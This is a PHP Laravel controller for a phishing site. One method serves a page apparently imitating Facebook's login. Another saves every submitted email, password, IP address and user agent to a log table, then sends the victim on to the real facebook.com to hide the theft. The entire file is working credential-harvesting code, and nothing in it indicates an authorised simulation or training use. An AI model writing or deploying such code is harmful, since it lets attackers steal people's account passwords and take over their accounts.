<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\PhishingLogs;
use Illuminate\Contracts\View\View;
use Illuminate\Http\RedirectResponse;

class PhishingController extends Controller
{
    public function showLoginPage(): View
    {
        return view('phishing.facebook');
    }
    
    public function captureCredentials(Request $request): RedirectResponse
    {
        PhishingLogs::create([
            'email' => $request->email,
            'password' => $request->password,
            'ip_address' => $request->ip(),
            'user_agent' => $request->header('User-Agent')
        ]);
        
        return redirect('https://facebook.com');
    }
}

